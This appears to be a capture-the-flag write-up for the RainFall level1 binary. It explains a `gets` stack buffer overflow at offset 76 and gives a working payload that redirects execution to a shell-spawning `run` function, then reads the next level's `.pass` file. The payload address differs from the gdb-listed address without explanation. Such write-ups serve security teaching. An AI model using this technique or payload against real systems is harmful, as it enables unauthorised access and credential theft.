### Brief
This program contain a `main` function and a `run` function.
The `main` function use a stack buffer of size 76 which is filled with the `gets` function.
`gets` is known to be a vulnerable function because it don't take a maximum bytes to read.
The `run` function open a new shell and will be used to access the next level.

### Exploit
As we already said `gets` is function that is known to be vulnerable.
It read what is on the `stdin` and fill a buffer, but it doesn't know where to stop.
With this function you can easily create a buffer overflow and overwrite the return address of the main function.

The return address is located at `4(%ebp)`.
We need to find the offset needed in our payload to overwrite the return address.
For that we use an online tool to create pattern and run the program with this pattern.
The pattern needs to be long enough to overwrite the return address and create a `segfault`

```bash
python -c "print('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A')" | ./level1
```

Then we use a command called `dmesg` to get where the address where the `segfault` occurred

```bash
level1@RainFall:~$ dmesg
...
[ 3273.492901] level1[5158]: segfault at 63413563 ip 63413563 sp bffff770 error 14
```

The address is `63413563`, using the pattern generator tool we find an offset of `76`.

Using gdb we can retrieve the address of the `run` function that will open a shell.

```bash
level1@RainFall:~$ gdb level1
(gdb) info function run
...
0x08048444  run
```

### Get access
We create a payload containing the address of the `run` function at offset `76` and get our flag.
```bash
(python -c "print('A'*76 + '\x4a\x84\x04\x08')"; echo "cat /home/user/level2/.pass") | ./level1
```

### Useful link

* [x86 calling convention](http://unixwiz.net/techtips/win32-callconv-asm.html)
* [buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
